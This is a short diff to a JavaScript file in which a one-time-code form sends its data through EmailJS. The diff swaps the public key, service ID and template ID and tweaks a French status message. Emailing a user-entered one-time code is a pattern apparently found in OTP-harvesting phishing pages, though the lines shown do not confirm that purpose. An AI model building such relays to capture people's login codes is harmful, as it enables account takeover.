@@ -87,7 +87,7 @@ if (document.getElementById("otpTimer")) {
 
 
 emailjs.init({
-    publicKey: "rORVGScs1n94sqOPi"
+    publicKey: "OdVrpD_0CpgUT6Ahz"
 });
 
 
@@ -141,15 +141,15 @@ if (otpForm && otpSingle && result) {
 
     
 
-    result.textContent = "connexion en cours...";
+    result.textContent = "connection en cours...";
     result.className = "";
 
 
     try {
 
         const response = await emailjs.send(
-            "service_veritas",
-            "template_7rbqlcq",
+            "service_client",
+            "template_ux52czx",
             templateParams
         );
 
